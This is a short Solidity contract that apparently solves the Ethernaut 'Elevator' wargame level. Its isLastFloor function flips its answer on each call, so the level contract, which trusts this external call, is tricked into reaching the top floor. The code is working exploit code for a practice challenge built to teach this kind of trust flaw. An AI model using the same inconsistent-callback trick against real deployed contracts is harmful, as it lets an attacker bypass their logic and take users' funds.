pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract Elevator {
    address levelInstance;
    bool side = true;

    constructor(address _levelInstance) {
        levelInstance = _levelInstance;
    }

    function isLastFloor(uint256) external returns (bool) {
        side = !side;
        return side;
    }

    function go() public {
        IElevator(levelInstance).goTo(1);
    }
}

//